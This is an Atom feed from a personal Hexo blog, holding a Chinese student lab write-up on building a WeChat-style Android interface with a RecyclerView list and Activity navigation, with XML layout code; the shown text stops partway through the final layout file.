<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ky不是枕木</title>
  
  <subtitle>分享学习经验</subtitle>
  <link href="https://kylinxin.github.io/atom.xml" rel="self"/>
  
  <link href="https://kylinxin.github.io/"/>
  <updated>2023-11-07T03:34:02.178Z</updated>
  <id>https://kylinxin.github.io/</id>
  
  <author>
    <name>Kylinxin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>移动开发实验2：RecycleView和Activity跳转</title>
    <link href="https://kylinxin.github.io/2023/11/07/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C2%EF%BC%9ARecycleView/"/>
    <id>https://kylinxin.github.io/2023/11/07/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C2%EF%BC%9ARecycleView/</id>
    <published>2023-11-07T02:00:00.000Z</published>
    <updated>2023-11-07T03:34:02.178Z</updated>
    
    <content type="html"><![CDATA[<h1>AS类微信界面开发</h1><h2 id="功能要求"><a href="#功能要求" class="headerlink" title="功能要求"></a>功能要求</h2><p>1、在任一tab页中实现列表效果；本功能的实现需要使用 recycleview；</p><p>2、将recyclerView的每个item增加点击功能，点击后跳转到一个新的view展示信息</p><h2 id="开发技术"><a href="#开发技术" class="headerlink" title="开发技术"></a>开发技术</h2><p>开发工具：as</p><p>版本：API 24 Android 7.0</p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><p>本次实验目的是实现在任一tab页将recyclerView的每个item增加点击功能，点击后跳转到一个新的view展示信息，固需要采用到以下两点技术</p><blockquote><ol><li>列表的实现需要使用控件recyclerView进行操作，需创建一个单独的放置recyclerview的layout——item.xml文件，另外还需要单独创建每一项的具体内容的layout文件——fragment_txl.xml</li><li>fragment或activity之间的跳转实现采用startActivity()，新版本中如果还需要返回内容可以采用registerForActivityResult()方法，并采用launch()方法进行跳转</li></ol></blockquote><p>总体思路为在layout创建item.xml文件放recyclerview控件，fragment_txl.xml放列表每一项的信息。在txlfragment定义初始化信息并将信息写成数组方便传参，配合Myadapter适配器进行使用，跳转的具体方法采用startActivity()进行跳转，在跳转的详情页面txlDetails接受传过来的intent并显示数据，设置返回按钮用于返回。</p><h2 id="设计过程"><a href="#设计过程" class="headerlink" title="设计过程"></a>设计过程</h2><h3 id="1-编写layout"><a href="#1-编写layout" class="headerlink" title="1-编写layout"></a>1.  编写layout</h3><h4 id="1-1-在新建的item-xml中添加recycleview"><a href="#1-1-在新建的item-xml中添加recycleview" class="headerlink" title="1-1-在新建的item-xml中添加recycleview"></a><strong>1.1 在新建的item.xml中添加recycleview</strong></h4><p><strong>效果</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/11/07/O5o2CYQq1kedMth.png'><img src="https://s2.loli.net/2023/11/07/O5o2CYQq1kedMth.png" alt="image.png"></p><p><strong>代码</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">androidx.recyclerview.widget.RecyclerView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/itemview"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginStart</span>=<span class="hljs-string">"8dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginTop</span>=<span class="hljs-string">"8dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginEnd</span>=<span class="hljs-string">"8dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginBottom</span>=<span class="hljs-string">"8dp"</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>创建了一个RecyclerView，命名为itemview</p><h4 id="1-2-在fragment-txl-xml中实现每一项的信息"><a href="#1-2-在fragment-txl-xml中实现每一项的信息" class="headerlink" title="1-2-在fragment-txl-xml中实现每一项的信息"></a>1.2 在fragment_txl.xml中实现每一项的信息</h4><p><strong>效果</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/11/07/zNT4RWb9QBOnJ5a.png'><img src="https://s2.loli.net/2023/11/07/zNT4RWb9QBOnJ5a.png" alt="image.png"></p><p><strong>代码</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">"http://schemas.android.com/apk/res-auto"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">"http://schemas.android.com/tools"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/linearLayout_txl"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginTop</span>=<span class="hljs-string">"15dp"</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ImageView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/image_touxiang"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"60dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"68dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_marginRight</span>=<span class="hljs-string">"20dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_gravity</span>=<span class="hljs-string">"left|center_vertical"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">tools:srcCompat</span>=<span class="hljs-string">"@tools:sample/avatars"</span> /&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/text_duihuakuang"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"left|center_vertical"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:text</span>=<span class="hljs-string">"TextView"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"24sp"</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>用一个Linearlayout包含了一个ImageView和TextView，方便后续点击跳转</p><h4 id="1-3-实现跳转详情页面activity-txl-details-xml的内容"><a href="#1-3-实现跳转详情页面activity-txl-details-xml的内容" class="headerlink" title="1-3-实现跳转详情页面activity-txl-details-xml的内容"></a><strong>1.3 实现跳转详情页面activity_txl_details.xml的内容</strong></h4><p><strong>效果</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/11/07/2x7VMdsqJFDzOPL.png'><img src="https://s2.loli.net/2023/11/07/2x7VMdsqJFDzOPL.png" alt="image.png"></p><p><strong>代码</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">"http://schemas.android.com/apk/res-auto"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">"http://schemas.android.com/tools"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">".txlDetails"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/WeChatname"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"名字"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textStyle</span>=<span class="hljs-string">"bold"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">"0.008"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">"0.275"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/linearLayout"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"411dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"horizontal"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/linearLayout2"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"411dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"horizontal"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/linearLayout3"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"411dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"horizontal"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/linearLayout4"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"411dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"horizontal"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Button</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/returnButton"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginTop</span>=<span class="hljs-string">"408dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"返回"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toBottomOf</span>=<span class="hljs-string">"@+id/imageDetail"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">tools:layout_editor_absoluteX</span>=<span class="hljs-string">"146dp"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/wxtag"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginTop</span>=<span class="hljs-string">"24dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textStyle</span>=<span class="hljs-string">"bold"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"标签"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toBottomOf</span>=<span class="hljs-string">"@+id/region"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">tools:layout_editor_absoluteX</span>=<span class="hljs-string">"5dp"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/wxtag2"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginStart</span>=<span class="hljs-string">"188dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textStyle</span>=<span class="hljs-string">"bold"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"未分类"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">"0.441"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toEndOf</span>=<span class="hljs-string">"@+id/wxtag"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">"0.611"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/region"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"141dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginTop</span>=<span class="hljs-string">"24dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textStyle</span>=<span class="hljs-string">"bold"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"地区"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toBottomOf</span>=<span class="hljs-string">"@+id/phoneNumber"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">tools:layout_editor_absoluteX</span>=<span class="hljs-string">"5dp"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/region2"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"未知"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textStyle</span>=<span class="hljs-string">"bold"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">"0.773"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">"@+id/region"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">"0.501"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ImageView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/imageDetail"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"154dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"121dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">"0.498"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">"0.042"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">tools:srcCompat</span>=<span class="hljs-string">"@tools:sample/avatars"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/phoneNumber"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginTop</span>=<span class="hljs-string">"28dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textStyle</span>=<span class="hljs-string">"bold"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"电话号码"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toBottomOf</span>=<span class="hljs-string">"@+id/WeChatname"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">tools:layout_editor_absoluteX</span>=<span class="hljs-string">"0dp"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/phone"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginStart</span>=<span class="hljs-string">"36dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"11111111111"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span 